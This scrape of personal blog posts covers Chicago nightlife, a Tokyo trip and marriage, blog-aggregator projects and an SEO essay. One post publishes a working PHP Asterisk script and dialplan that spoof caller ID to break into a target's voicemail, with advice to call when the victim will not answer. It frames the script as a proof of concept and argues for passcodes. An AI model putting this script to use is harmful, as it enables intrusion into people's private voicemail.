<p>Then I went ahead and start part .5 of the <a href='http://www.geopoli.com'>geopoli.com</a> idea I had awhile ago. I need to whip that up. soon</p>

<p>And now bedtime.</p>

                <p>I started with <a href='http://thestoryofharper.com'>thestoryofharper.com</a> and then I created the site for <a href='http://hiromiandharper.com'>hiromi and myself</a>. So after writing all the cool classes to make this easy I decided to make the <a href='http://blogs.nata2.org'>blogs.nata2.org</a> site and then tonight I redid the reedbooks.org site to be an aggregate of my families blogs. fun fun.</p>

<p>The sites follow a pretty simple formula. Basically all i am doing is picking up the RSS feeds of a particular set of blogs and displaying them nicely. I am also grabbing some flickr pictures to spice up the pages. And thus creating a place where a person can view all of the set of peoples stuff. I guess this would be considered a mashup of sorts.. but it feels more like another view of the blog. So <a href='http://www.reedbooks.org'>reedbooks.org</a> - I originally got <a href='http://www.reedbooks.org'>reedbooks.org</a> as a domain for my mom&#8217;s email. So since i had the domain and it had an unused wordpress install on it - I decided to change it back to the blog aggregate that it once was. So I just copied the form of <a href='http://www.hiromiandharper.com'>hiromiandharper.com</a> and did some other trickery. It is cool. So <a href='http://www.reedbooks.org'>check it out</a>. Now I just got to make sure everyone keeps updating their blogs. I wonder what will be next&#8230;. hopefully doing the same thing but making money. I do love money.</p>

                <p>This weekend was pretty fun. I guess most of my weekends are. This one started out super weird. On Friday&nbsp;I was supposed to go to the sox game with Robyn. However, as I was leaving work - there was a tornado. haha. actually I was sitting,&nbsp;finishing up some stuff at work and the air raid/ tornado sirens started up. It was insane. I have never heard those. I thought we were going to get bombed. I put up all the blackout shutters and turned off&nbsp;all the lights. luckily nothing happened. So I ended up missing the sox game, so I came&nbsp;home and played katamari. Then I met up with Tag and we went out. It was a pretty normal night out -&nbsp;we ended up at SoundBar and broke Jordan's phone. Humor.</p>

            <div class="PostContent">
                <p>So there has always had a problem with US mobile providers having their voicemail be susceptible to being compromised by calling with a spoofed caller id. Apparently most providers caller id apps just checks the referring callerid - and doesn&#8217;t force the voicemail user to pick a passcode; so it allows someone to trick the voicemail app into believing they are calling from a trusted number.</p>

<p>This has been covered all <a href='http://www.toast442.org/C662738431/E680925937/index.html'>over the</a> <a href='http://www.i-hacked.com/content/view/124/47'>Internet</a> and was in the <a href='http://www.macdevcenter.com/pub/a/mac/2005/01/01/paris.html'>spotlight</a> awhile back when it was alleged that this was how <a href='http://blog.tmcnet.com/blog/tom-keating/mobile-phones/paris-hilton-hacks-voicemail-using-asterisk.asp'>Paris Hilton's mobile phone was hacked</a>. It is a pretty big problem and is probably really easy to fix.</p>

<p>So, just to make things funnier - I decided that I would release a snippit of code that would make it easier to execute this hack. <pre class='markdown-html-error' style='border: solid 3px red; background-color: pink'>REXML could not parse this XML/HTML: 
&lt;blockquote&gt;#!/asterisk/php/bin/php -q
&amp;lt;?</pre></p>

<p>set_time_limit(30); //make sure the php script doesn&#8217;t time out require(&#8216;phpagi.php&#8217;); // include the phpagi class error_reporting(E_ALL); // limit the errors</p>

<p>$agi = new AGI(); // instantiate the AGI class $agi-&#62;answer(); // answer the phone sleep(2); // wait a sec or two</p>

<p>$agi-&#62;stream_file(&#8216;enter_spoof&#8217;); // speak a wav file that says &#8220;enter the number&#8221; $result = $agi-&#62;get_data(&#8216;beep&#8217;, 3000, 10); // beep and grab the 10 numbers $agi-&#62;verbose(&#8220;Number to call:&#8221;.$result<span>&#8216;result&#8217;</span>); // throw info so you know whats up $agi-&#62;set_callerid($result<span>&#8216;result&#8217;</span>); // set caller id to the number you are calling $agi-&#62;exec(&#8220;Dial IAX2/iax-provider/1&#8221;.$result<span>&#8216;result&#8217;</span>); // call the number</p>

<p>?&#62;&lt;/blockquote&gt; You can add this to your /var/lib/asterisk/agi-bin dir and then specify the extension you want to use to dial and execute the php/agi script <blockquote>exten =&gt; 666,1,Answer
exten =&gt; 666,2,AGI(tmobilevoicemail_spoof.php)
exten =&gt; 666,3,Hangup</blockquote> Then when you dial 666 it executes the script. It will ask you what number to dial then dial it after setting the caller id to the same number. It will dial the number and then ring the phone. If the phone is on and the target number is answered - it won&#8217;t work; however if the person doesn&#8217;t answer you will be placed in the targets voicemail as a trusted user. So, I would suggest calling people in the middle of the night or when you know they will not answer. Wait.. I actually wouldn&#8217;t suggest calling anyone but yourself.</p>

<p>It seems to me that the only viable solution that will be compatible with all phones, people and providers is to force the users to choose passcode to your voicemail.</p>

<p>This is - of course - a proof of concept. You should not actually hack peoples voicemails. That is not very nice. We are into being nice.</p>

                <p>So i am on the train and i amd playing with my phone and i end up frying my sim card. apparently nokia has some security implementations that will fry your sim card if you enter the pin code wrong more than 5 times and then enter the PUK code wrong more than 10 times. So i called tmobile and they were like &#8220;you are screwed.&#8221; So i am sad. nobody can call and i can&#8217;t get txt messages. so screwed. haha</p>

<p>So now i am in tags car - using his fancy internet. with a toasted phone. someday. my prince will come.</p>

                <p>I redid this mini site using smarty, magpie rss and some other tricks. It is now pretty nice. I like using wordpress themes. It makes it easier. I can have a decent looking site (they are all blog like anyway) in about 5 minutes. Sometimes its a pain though. But it turned out nice i think.</p>

<p>So anyway, check out the site: <a href='http://blogs.nata2.org/'>blogs.nata2.org</a></p>

<p>All it is, is an aggregate of all my friends blogs. I am got bored - so some functionality is missing. but for the most part it works. and is a lot better than the old one. It should be a bundle of an amount faster too.</p>

<p>Let me know how it works, and if you want your blog on their and it isn&#8217;t - let me know too.</p>

                <p>The other day I read the great post about <a href='http://www.seoegghead.com/blog/seo/mattcuttsarama-a-summary-of-useful-stuff-matt-cutts-has-said-p112.html'>Matt Cutt's SEO tips and tricks</a> that were gleaned from his great blog. It was probably one of the most helpful SEO articles I had read in a minute. It summarized some points that I had learned throughout the years with just a couple sentences. Good work.</p><p>While the article was still fresh in my mind I was talking to <a href='http://www.jacobd.com/'>Jacob</a> about how our host, <a href='http://www.rackspace.com'>rackspace</a>, now advertises on the <a href='http://coudal.com/deck/'>DECK</a>. Which is pretty neat. I like rackspace and I hope they get some good feedback from the web 2.0 crowd. They have certainly made my life better. I think its cool because the DECK isn't like other advertisers. They are not at all like <a href='https://google.com/adsense/'>adsense</a> or like <a href='http://www.adbrite.com'>adbrite</a>. You seemingly don't put a bundle of JavaScript on your page and then have them server you ad content that you don't have control of.</p><p>The <a href='https://google.com/adsense/'>DECK</a> seems to be a discrete group of content publishers that are offering targeted links to their users. And the advertisers don't pay per click - they have a solid price for the set of months. Its pretty steep - but the sites are pretty dope sites and like the DECK site says - you are paying for the influence. So as their site say:</p><blockquote><p>Plus, The Deck ads are not redirected and the average page rank of the eight Deck sites is 7.125 which can make a significant difference in an advertiser's search rankings during and well after a campaign is complete.</p></blockquote><p>So the DECK is leveraging the PageRank of their sites as a reason to buy into their program. And because the ads are not redirects - but in fact true links - the PageRank should trickle down to the advertisers site.</p><p>This leads to an interesting problem. With this in mind, isn't the DECK just a fancy, pretty and superstar big brother of the link spammers who are selling and buying links on high pagerank sites? Don't get me wrong, as a consumer I blanketly trust the DECK more than I do adsense, and I feel that the philosophy behind it is pretty solid and correct. But in this day an age - can a good and "not evil" philosophy beat the Google engine?</p><p>As per tips from the Matt Cutts summarization - the DECK theoretically breaks two of the rules:</p><blockquote><p><strong>13. </strong><a href='http://www.mattcutts.com/blog/guest-post-vanessa-fox-on-organic-site-review-session/'>http://www.mattcutts.com/blog/guest-post-vanessa-fox-on-organic-site-review-session/</a><br />
Earned-links are earned and given by choice.  Google does consider buying text links for PageRank purposes to be outside our quality guidelines. Vanessa Fox. 2006.</p></blockquote><p>and</p><blockquote><p><strong>15. </strong><a href='http://www.mattcutts.com/blog/text-link-follow-up/'>http://www.mattcutts.com/blog/text-link-follow-up/</a><br />
Googles is against selling/buying links, and Matt indicates they are good at spotting them  both algorithmically and manually. Sites that sell links can lose their trust in search engines. 2006.</p></blockquote><p>The DECK links are not earned in a normal way. I am sure that people that run the DECK don't let the cialis/mortgage people place an ad, so in a sense that editorial right of refusal allows the DECK to uphold some of its idea of an earned link. The other problem is bigger - their isn't a way around the fact that the DECK either on purpose or on accident is selling links. And the fact that they mentioned their high pagerank doesn't really help matters in regards to the above mentioned rules.</p><p>I am seriously doubting that Google is seeing this as plain jane link spam. But it does seem that with Google's algorithmic approach to finding PageRank link violations - the DECK may be in violation. And the reputation of the sites that advertise with the DECK and the DECK sites themselves may find their ranking being affected.  This excerpt from the Google <a href='http://www.google.com/support/webmasters/bin/answer.py?answer=35769'>webmaster guidelines</a> is pretty clear on this issue:</p><blockquote><p>Don't participate in link schemes designed to increase your site's ranking or PageRank. In particular, avoid links to web spammers or "bad neighborhoods" on the web, as your own ranking may be affected adversely by those links.</p></blockquote><p>I think we can all agree that the DECK is not a "bad neighborhood" and it isn't a link spammer - so what is it. If we were to scale the program to include thousands of sites instead of under 10 - their might be a problem. But as it stands now - they are just selling links and promising good things to happen - while causally mentioning their pagerank.</p><p>It just seems interesting that the Google rules that govern all of us web people would happen to place a cool advertising program like the DECK  into the same category as a common link spammer.

                <p>It was like a dream. an annoying dream.</p>

<p>I got on the train at jefferson park and noticed some dumbass meatheads sitting with their suburban looking girlfriends in the middle of the train. They were being loud and obnoxious and pretty annoying. Their were multiple angry looks by the other passengers as their rockus behavior became more and more rude. So anyway - I was sitting their and reading foundation by isaac asimov - minding my own business when one of the dudes starts yelling about how some dude just flipped him off. He was all &#8220;wtf. did that dude just flip me off?&#8221; - &#8220;hey asshole, did you just flip me off?&#8221; and what not.</p>

<p>So the entire train looks to the dude and is wondering what happened. and the guy getting off the train is like &#8220;with what finger would i have flipped you off with&#8221; and holds up his hand which is missing the middle finger. Man. that dude was confused. The entire train was pissed at his rudeness and general lack of respect. They all just glared at these three suburban asses. Luckily i got out at logan square.</p>

<p>Sometimes the ignorant people from the suburbs are SOOOO annoying. not like the ignorant people from the subway. they are awesome.</p>

                <p>I am watching the <a href='http://www.bbsdocumentary.com/'>bbs documentary</a>. Its amazing. I started watching clive barker&#8217;s Lord of Illusions - but it sucked. It always sucked. It sucked when i saw it in the theatre and it sucks now. So as soon as i remembered that it blew - i also remembered how awesome the BBS Doc was. So i put it in and now it is awesome. AWESOME i say.</p>

<p>I kinda want to run a bbs on one of my boxes. probably synchronet. If anyone wants in - leave a comment and i will hook it up. I think it will be mainly a way to irc. and play door games ;)</p>

<p>So tonight was a night of synchronicity. I started out reading dune. I ordered it and it arrived friday. I finished it this afternoon. It was amazing. I remember my dad mentioning it when i was a kid - but for some reason i never wanted to read it. Until i was tired of all the books i had sitting by my bed. So <a href='http://en.wikipedia.org/wiki/Dune_(novel)'>dune</a> was amazing. AMAZING. I totally understand why it was so popular. I am weighing whether i should read that rest of the books by Frank Herbert. I am not really into the <a href='http://en.wikipedia.org/wiki/Dune_Universe'>dune universe</a> at all - just the initial story.</p>

<p>I love wikipedia. What is right about it is all that is wrong with the commercial encyclopedias. What is wrong with it - is what is right about all the pay sites. lame.</p>

<p>So anyway. Tonight and how things work. So after dune was finished, i went to subT to watch <a href='http://www.americanfuckingheritage.com/'>american heritage</a> play for their record release party. I bought their cd and their awesome shirt. It ruled. While their i saw my buddy choke and we hung out. Talked cabinets with one of his band mates and just chilled. Then while walking home i ran into jordan and used his +1 for the soulwax/2manydjs party. So good. I was very very surprised.</p>

<p>Now back to the BBS Doc. hah.</p>

                <p>So i have been writing drafts of posts with <a href='http://www.google.com/url?sa=t&ct=res&cd=1&url=http%3A%2F%2Fwindowslivewriter.spaces.live.com%2F&ei=N-AJRajZMaisYa6xkKoK&sig=__afbfj0mODvsePvWxmbodTq1zXAQ=&sig2=wE8nG2tX6cJTFV6lIT_FKA'>windows live writer</a>. It does a decent job. It makes blogging a bit more easy for peeps who don&#8217;t really like working in a browser. I think along with the flickr plugin - it may be a decent blog editor for people like my mom and dad, who are decent at computers but really don&#8217;t have a care to learn how to update a blog. I liked it. I like having spell checker - even though it was a pretty shitty spell checker. hah.</p>

<p>Tonight jeffrey got us list for the converge and mastodon show at the metro. I am excited but i am awfully tired. and i can&#8217;t stop listening to <a href='http://www.musewiki.org/MuseWiki'>muse</a>. It has been a long day. just muse. i tried listening to a lot of other music - but muse kept coming back. its killing me. Muse is rather interesting though, because the following of the band is quite obsessive. They seem to find all sorts of interesting symbology and what not in the music. I find their fans very similar to tool fans. I find muse very similar to queen. hah. i rule. today dragged and dragged. I have been setting up <a href='http://www.dd-wrt.com/wiki/index.php?title=WDS_Linked_router_network'>WDS </a>on some linksys routers taht are hacked with the <a href='http://www.dd-wrt.com/dd-wrtv2/index.php'>dd-wrt</a> firmware. it should be easy, but it is killing me. ahhhh.. they will be done soon though. and i will be really happy. i just wish there was a decent way to test them.</p>

<p>I need to get some food.</p>

<p>So, apparently, attempting to get a visa to the U.S. is a bunch of work. It really demonstrates how much bureaucracy is involved in government work. When we were all done with our forms and what not, I bet I had one full ream of paper all filled out. Insane. And the web sites that claim to be helpful are not helpful. They themselves are often victims of the very bureaucracy they are attempting to destroy. They will update the web sites with new regulations and whatnot, but then leave the old PDF forms up. wtf. insane. it made it very hard to get everything right. But it worked. so I am not so sad. I think I will be much happier when it is all over and Hiromi is in the U.S. Then I will know all the hard work paid off.</p>

<p>So Tokyo visit:</p>

<p>I left for Tokyo on the 24th of august. A Thursday and landed midday on the 25th. I was profiled as a drug user and had my luggage searched. Why I say drug user is that they just felt around the lining of my luggage and didn&#8217;t look through my stuff at all. weird. anyway. I found Hiromi and we went to get my dad. However he apparently had landed a bit earlier than me and was also looking at me. So we all ran around Narita looking for each other. Hiormi and I gave up and I went to plan B - which was to meet at my fathers hotel in Ueno. So Hiromi and I rushed over to Ueno (and by rushed I mean casually hung out on the train for an hour. heh). My father stayed at the <a href='http://flickr.com/photos/natatwo/225602099/in/set-72157594253331806/'>Sofitel Tokyo</a> in Ueno which looks insane. We found my dad and stumbled outside to get some foods. We went to a decent place in Ueno to get food and it was awesome. I had some really good seafood and my dad and I shared some raw horse meat. w00t. Then we all crashed. So Hiromi and I made our way back to Higashi-jujo to her apartment and my father made his way back to his hotel.</p>

<p>Then on Saturday Hiromi had to work. So I made my way to my father&#8217;s hotel. The walk from the JR Ueno station to the sofitel was awesome. It was through this really dope park. There were all sorts of <a href='http://flickr.com/photos/natatwo/226023233/in/set-72157594253331806/'>crazy lily flowers</a>, mini <a href='http://flickr.com/photos/natatwo/226023679/in/set-72157594253331806/'>temples</a>, <a href='http://static.flickr.com/65/226025428_2e47586aa4_s.jpg'>koi</a> and people doing <a href='http://flickr.com/photos/natatwo/226023514/in/set-72157594253331806/'>calisthenics</a>. So I met my dad at the hotel and off we went on our adventure. I had never navigated tokyo by myself and I was a bit apprehensive. But after finding the nearest postal station and making it to the <a href='http://flickr.com/photos/natatwo/226025538/in/set-72157594253331806/'>train</a> and Akihabara I was no longer worried. We helled about Akihabara and even participated in some crazy street product giveaway which awarded my father and I some horrible energy drink. It was pretty funny. We then had lunch at a quite interesting Irish pub and decided it best to head on to the parasite museum to view some scary buddies.</p>

<p>We headed over to the Meguro area and made our way to the museum. For those who haven&#8217;t had the awesome opportunity to witness this museum - it is simply amazing. Quite interesting and <a href='http://flickr.com/photos/natatwo/226026626/in/set-72157594253331806/'>very peculiar</a>. The best is the tapeworm. So gross. <a href='http://flickr.com/photos/natatwo/226026923/in/set-72157594253331806/'>This is a picture</a> of my dad next to the tapeworm, holding a quarter up for size comparison. I really like the meguro area. It is very <a href='http://flickr.com/photos/natatwo/226026820/in/set-72157594253331806/'>pretty</a> and feels much calmer than many areas of Tokyo. At some point we <a href='http://flickr.com/photos/natatwo/226027442/in/set-72157594253331806/'>got umbrellas and pointed at stuff</a>. We also managed to find a bar at quite early in the day and had a couple beers. It was really funny because the bar owner was obviously not ready for people. She had to turn on all sorts of giant electronic devices - including the biggest stereo I have ever seen. It was such a small place and the stereo was SO big. After that we met Hiromi back at the hotel and got dinner. Once again the walk back to the hotel was amazing, we went a different route this time, and ran into a bunch of randomness. First we watched a <a href='http://flickr.com/photos/natatwo/226028665/in/set-72157594253331806/'>baseball</a> <a href='http://flickr.com/photos/natatwo/226027758/in/set-72157594253331806/'>game</a>. It was pretty cool. Obviously some amateur league. Then we ran into a bunch of statues and such. We also got a chance to see the <a href='http://flickr.com/photos/natatwo/226030704/in/set-72157594253331806/'>wild cats</a> in a more sleepy state.</p>
<a href='http://www.flickr.com/photos/natatwo/226032838/' title='Photo Sharing'><img title='We are amazing people' src='http://static.flickr.com/80/226032838_5525ee1654_m.jpg' align='left' alt='We are amazing people' /></a>
<p>We were supposed to meet Hiromi in her neighborhood at some point - but she called and said she was going to be much later than she expected and suggested a bar near her house where we could meet up. So my father and I went to said bar and imbibed in a couple beers before Hiromi arrived. This bar was really funny. We strolled in and sat down and ordered beer. We of course didn&#8217;t fit in and these three ladies kept talking to us and gesturing - but they seemed to know about as much English as we knew of Japanese - so their communications attempts were met with nods and more alcohol. But by the time Hiromi arrived we were all good buddies. Hiromi ordered us some food and we all enjoyed it quite a bit. After awhile we were able to get them to take <a href='http://flickr.com/photos/natatwo/226040837/in/set-72157594253331806/'>some great</a> <a href='http://flickr.com/photos/natatwo/226040699/in/set-72157594253331806/'>pictures of us</a>, and Hiromi took one of <a href='http://flickr.com/photos/natatwo/226041106/in/set-72157594253331806/'>my dad and I with our new friends</a>. We then went to Hiromi&#8217;s apartment to show my dad the sheer volume that it occupies and then took my father back to Ueno. A rather good day. It was fun because it was so chaotic and had no plan or focus. We got lost and was led on an excellent adventure.</p>
<a href='http://www.flickr.com/photos/natatwo/228269033/' title='Photo Sharing'><img title='Godzilla!' src='http://static.flickr.com/69/228269033_346c78a5ae_m.jpg' align='right' alt='Godzilla!' /></a>
<p>The <a href='http://www.ninja.tv/top_main.html'>ninja restaurant</a> is insane. I can&#8217;t really describe it any better. Absolutely insane. It was like going into <a href='http://www.casabonitadenver.com/'>casa bonita</a> but instead of some misinterpretation of Mexican culture - it was some crazy interpretation of ninja culture. Like if my brother and I designed a ninja den and then ran a restaurant out of it. There was a drawbridge, a bunch of dark and low passageways and a bundle of people yelling. It seemed to be tailored to be westerner friendly (i.e. they had English menus). The whole place was awesome. At first i was quite worried that the casa bonita comparison was not just in weirdness - but also in its horrible food. But luckily the food was amazing. It was very good.</p>

<p>It was also really awesome to hang out with <a href='http://flickr.com/photos/natatwo/228270107/in/set-72157594253331806/'>Hiromi's friends</a>. They are all so nice. They all work for a music magazine - so the night turned into a music discussion. It was awesome. We also ended up going to a really nice bar near the restaurant and having a bundle of drinks. <a href='http://flickr.com/photos/natatwo/228270214/in/set-72157594253331806/'>So nice</a>.</p>

<p>The next day was a big day for us. We all met early and headed off to <a href='http://en.wikipedia.org/wiki/Yamanashi_Prefecture'>Yamanashi</a> to meet Hiromi&#8217;s parents and get married. We took the train this time - instead of the bus - and got to Yamanashi in around one and a half hours. We met up with hiromi&#8217;s parents and went to the local county office to do the marriage thing. In japan, unlike here in the US, getting officially married is quite easy. All you have to do is just submit the <a href='http://flickr.com/photos/natatwo/228271833/in/set-72157594253331806/'>proper form</a> to the &#8220;court house&#8221; and then you are married. I think i only had to <a href='http://flickr.com/photos/natatwo/228271880/in/set-72157594253331806/'>pay around 400 yen</a> too. It was awesome.</p>
<a href='http://www.flickr.com/photos/natatwo/228273235/' title='Photo Sharing'><img src='http://static.flickr.com/61/228273235_98ab5d2a9e_m.jpg' align='left' height='180' alt='tokyo dads pictures2 274' width='240' /></a>
<p>After we that we left Hiromi&#8217;s home town and went to her favorite cafe. It was nice. We just <a href='http://flickr.com/photos/natatwo/228974842/in/set-72157594253331806/'>hung out</a> and rested. Very stress relieving. We then met up with one of Hiromi&#8217;s friends and went to an awesome noodle shop - that specializes in noodles that are from Yamanashi. So good. After dinner we went to the train. Fell asleep and somehow made it to tokyo and then home.</p>

<p>Wednesday was our day for visa stuff. We met my dad and had a nice lunch with him and then took him to the train back to Narita. We then made our way to the Embassy and waited in line. The longest line ever - except that line luckily wasn&#8217;t for us. We did our visa thang and eventually made it back out. We had a light lunch and passed out for the afternoon. We kept things pretty calm and easy for the night.</p>

<p>On Thursday we slept in and chilled out. We eventually made it to see <a href='http://imdb.com/title/tt0410097/'>Hustle and Flow</a>. It was pretty surreal seeing a hip hop movie in tokyo - with a lot of older people in the theatre. Weird. hah. The movie is great though. I quite enjoyed it.</p>

<p>On Friday checked of some stores in Omotesando. I was able to see <a href='http://flickr.com/photos/natatwo/231490356/in/set-72157594253331806/'>the bape store</a> and look at their insane clothing. The most impressive thing in their store was the actual store. It was retarded. I felt that i would fall down quite often. It was pretty intense. We then made our way down to harajuku and checked out the <a href='http://flickr.com/photos/natatwo/231490612/in/set-72157594253331806/'>BBC/Ice cream store</a> and some other streetwear stores. The best part about friday however was eating dinner at one of my favorite places in tokyo. The Via Nuova Rondo. So good. It is Italian food with a great Japanese twist. I miss it so. I love going there with hiromi&#8217;s and having a nice dinner.</p>

<p>On Saturday, which was my last day in Tokyo, we ran some errands picking up some gifts for my coworkers in tokyo station. Then we chilled out and made it to my other favorite restaurant in tokyo - a sashimi place in Azabujuban. It is so good. I love it. I had some incredible <a href='http://flickr.com/photos/natatwo/231773846/in/set-72157594253331806/'>sashimi</a> and hiromi&#8217;s and i shared some <a href='http://flickr.com/photos/natatwo/231773715/in/set-72157594253331806/'>great fried</a> <a href='http://flickr.com/photos/natatwo/231773676/in/set-72157594253331806/'>dishes</a> - which i had to wash down with more <a href='http://flickr.com/photos/natatwo/231773615/in/set-72157594253331806/'>sashimi</a>. hah. and of course a <a href='http://flickr.com/photos/natatwo/231773742/in/set-72157594253331806/'>healthy helping of pickles</a>. I apparently love Japanese pickles more than i love my brother. So quite a bit. hah.</p>

<p>On Sunday i sadly had to leave. I was bummed. But i will see hiromi soon enough, but this time she will be living here. whee. One cool thing about flying back to Chicago this time - is that my frequent flyer miles finally paid off. I was able to upgrade for free to business class. That is a much nicer way to travel than economy. I slept like a baby the whole way home. a rather drunk baby.</p>
<a href='http://www.flickr.com/photos/natatwo/231589833/' title='Photo Sharing'><img src='http://static.flickr.com/81/231589833_9462c0d9eb_m.jpg' align='right' height='180' alt='Hiromi and me!' width='240' /></a>
<p>I did end up surprising her with a ring. I had not completely planned for it - but i <a href='http://flickr.com/photos/natatwo/221464006/in/set-72157594246258213/'>found one</a> that i really liked and i knew Hiromi&#8217;s would really like - so i got it for her. She was quite happy.</p>

<p>We also have a <a href='http://bash.org/?674532'>bash quote that has it roots in our marriage</a>. When i was telling my friend from highschool about our marriage he proclaimed: <blockquote>I bet in 1997 you would not have guessed you would be getting married before duke nukem forever came out</blockquote> and i submitted it to bash because i thought it was hilarious and lo and behold, it was picked up. whee. fun.</p>

<p>Well. i am done with this entry. It has been a work in progress for quite awhile and i am happy to get it out. The trip and experience was amazing. I love visiting tokyo and meeting up with all of Hiromi&#8217;s friends. They are all so nice. I hope to see them soon. I can&#8217;t quite vocalize how happy and excited i am for the future with hiromi and myself. I am very happy.</p>
<strong>To the Future!</strong>

And since jacob has shown me that music video, i have been listening to muse like a madman. Such a funny video. Amazing.</p>

                <p>So <a href='http://www.randombyte.net/blog/'>falbum</a>, the awesome flickr photo gallery for <a href='http://wordpress.org/'>wordpress</a>, broke this afternoon around 4pm due to the API key for the plugin expiring. <a href='http://www.nata2.org/photos/'>This</a> is <a href='http://www.hirominakazawa.com/photos/'>annoying</a> and <a href='http://www.dylanreed.org/photos/'>somewhat</a> <a href='http://www.randombyte.net/blog/photos-main/'>funny</a>. It seems that as of right now - all falbum sites are broken. hah. Every single one. Doesn&#8217;t this seem to be a flaw in flickr&#8217;s <a href='http://flickr.com/services/'>API program</a>. I hope there is a way for the author of flabum to renew his API key. Because if he has to manually change it in his code then &#8220;deploying&#8221; an update because flickr broke or expired his API key is rather annoying</p>

<p>I have a bundle of keys that i have applied for and used in my own applications and i have never had any of them expire. how annoying. i wonder if he received a message.</p>

<p>While i am wondering, I also wonder why it expired? Do you think it possible that the sheer number of falbum&#8217;s out there trigger some API abuse call. Or maybe flickr hates wordpress?</p>

<p>Apparently this has <a href='http://flickr.com/groups/api/discuss/72157594263979990/'>happened to peeps before</a>. So maybe Mr Falbum will be able to email flickr and have it reinstated. How annoying.</p>

                <p>I am freezing. Seriously. It suddenly got like 100 below zero up in this piece. But never fear. i have a coat. and i will where it when i go outside. Which doesn&#8217;t help me while i am cold here in my living room. hah. last night or maybe it was the previous night - i was ready for snow. but now that it is colder than it was, i am not ready for snow. hah.</p>

<p>and i am wearing the same pair of shorts i have worn everyday since the beginning of june. these are some worn in shorts. and very inappropriate for the weather. i just need to pull my socks up more.</p>

<p>So this weekend was pretty fun. kinda crazy. I have still be sleepy since returning from tokyo and i have been needing a lot of naps and whatnot. so that has been interesting. Juggling naps and whatnot with going out and work. I sleep a LOT. on friday i was meeting up with derek and tag to go out and rumble in the bronx. So i came home from work. and immediately slept until 10. Like no problem. Got up. Met <a href='http://derek.broox.com/'>derek</a>. and stumbled to the underdog to get a hot dog. it was gross. not the best culinary decision i have made recently. We randomly met up with <a href='http://www.danielleclock.org/blog/'>clock</a> and then met tag and and co at tumans. We hung out with kira and the girls at tumans and got tired of the madness of hipsters - so we went to liars club. After the naked guy danced to nelly and we were tired of badly dressed wierdos and crazy people we went to cobra lounge. Man. I love cobra lounge. It plays metal. Has weirdos and generally is a great place. We stayed their until it closed. Then we went to crobar. After danielle used her &#8220;endownment&#8221; to get us shots and expensive drinks - the night turned really crazy and fun. We just ran around and verbally abused each other until we had the worse pizza in the word. Not a good scene. I think it hurt us all.</p>

<p>Then saturday. I hung out with jeffrey and then napped. I slept from like 4 until 9:30. wtf. Then i met up with matiss and erica to watch <a href='http://imdb.com/title/tt0435625/'>descent</a>. It ruled. So scary. So claustrophobic . The weird orc miner creatures were pretty scary and the gore was plentiful. It was nice to see a decent horror movie that involves scary shit without stupid stupid plots. After the movie i met up with tag and jordan and went to <a href='http://www.darkroombar.com/'>darkroom</a> to see <a href='http://www.myspace.com/flosstradamus'>Flosstradamus</a> spin. It owned. Their was more streetwear in darkroom than at a bape convention. It was retarded. Jordan and i joked that you could make a parachute from all the bandanas around peoples necks. They aren&#8217;t cowboys at all. It was pretty fun. A lot of good shirts. hah. i shoudl have worn one of mine out. hah. Tag an i weren&#8217;t really feeling the vibe so we swiftly went over to y bar. I love y bar. For some reason it is exactly what i want a lot of the time. And it is fun to hang out with hiroki. Then soundbar where <a href='http://www.wylywade.com/'>wyly</a> met up with us and we proceeded to get really drunk and stupid. fun. and insane.</p>

<p>Then today i woke up. chilled out. watched broken flowers and wrote this. hah. now LAUNDRY!</p>

                <p>For some reason my google talk is broken for my person gmail account. It doesn&#8217;t log me in while i am in gmail, or gaim, or even using their gtalk client. Its really weird - because if i log in using another account - it works fine. But if i log in using my primary account. its broken. So annoying. Especially because people are starting to adopt google talk as a more de facto way of contacting peeps. and because i was just starting to hit up all my friends with gmail accounts. So sad..</p>

<p>I wonder why it happens. And whats weird is that it is account based. not service based. Like when my gmail stopped working for a couple days. So crazy.</p>

                <p>So i have been in chicago barely 12 hours. I slept 5 hours. And went to clubs for 7 hours. It was awesome. But the real reason i love chicago is the strict diversity that is celebrated at every turn. At every stop you see different people doing different things. All rocking it.</p>

<p>Tonight:</p>

<p>We started at sushi wabi. I had a steak - cuz i had just had excellent sashimi and sushi in tokyo and didn&#8217;t want to taint my memory with paltry really good sushi. So anyway. we hung out and had excellent food and chilled to good food. <a href='http://americanfuckingheritage.com/'>Scott shellhammer</a> deejayed and created a great feel for sushi. haha. go see his band play on the 17th. it will be great.</p>

<p>Then after wabi we headed to cactus to catch Arman&#8217;s night of craziness. He turned 40 and had an unofficial birthday at cactus with his dayra party. It was awesome. We hung out - listened to amazing deejays. Had a nice time. If someone bombed that venue - all of the chicago deejays would have died. I talked to diz. We shared tshirt and streetwear battle wounds. Its a hard life. House music!</p>

<p>Then after that we headed to smart bar to check out mark verbos&#8217; set. He plays a live PA and does amazing techno. really great stuff. Amazing music and amazing skills that man. It was good. The sound system was amazing - as it always is at smart bar. Mark really brought out the stops and brought the noise hard. as he always does. good job.</p>

<p>So then we headed to soundbar to check out the arab underground. There is apparently a islam/arab conference in chicago this weekend. and the official party was at soundbar. They apparently bought the house and hired their own promoters and what not. It was crazy. super busy. and totally aggro. I have never been faced with so many potential fights. My friend may mentioned that thier were more fights than ever on this night. totally nuts. My bartender ladies were all bummed - cuz it wasn&#8217;t as good of night and everyone was angry and rude. weird. and.. i shit you not.. amjad even seconded it&#8230; it smelled like curry on the dance floor. wtf. why do certain situations only help solidify stereotypes. that shit is fucked up.</p>

<p>Then after that we went to crobar for horrible music. It was hilarious. We saw claudia (always a great time), and hung out. Then red hair matt accosted me and my buddy mike bought us bottle service to celebrate my marriage. awesome. really fun.</p>

<p>Then we went to lalos for burritos. It was good and totally what i was looking for. totally different from tokyo food. almost anti-japanese. funny. i love japanese food - but tonight i needed the differential.</p>

<p>SO yea. that is why i love chicago. It forces diveristy on you. It gives you no choice but to accept difference and embrace it. Unlike so many cities i have visited which ignore diversity of its people and makes everyone dance to the same drum; chicago makes you dance to someone else drum. i love it.</p>

<p>anyway.. i am sleepy. and the <a href='http://www.nzherald.co.nz/section/story.cfm?c_id=2&ObjectID=10399674'>crocodile hunter</a> was killed. wtf. i guess it makes sense. He was asking for it. but still. that shit aint real.</p>

<p>Oh and i will write a tokyo blog soon. I need to sleep now. Oh btw, <a href='http://hirominakazawa.com'>hiromi</a> updated her blog with an entry about our visit. <a href='http://hirominakazawa.com/2006/09/03/wow-marriage/'>Check it out here</a>.</p>

To the future!</p>

<p>Check out hiromi&#8217;s blog: <a href='http://www.hirominakazawa.com'>hirominakazawa.com</a>. i fixed it up a little bit. New theme. Made the flickr gallery work. Tweaked it a bit. I think it is nice.</p>

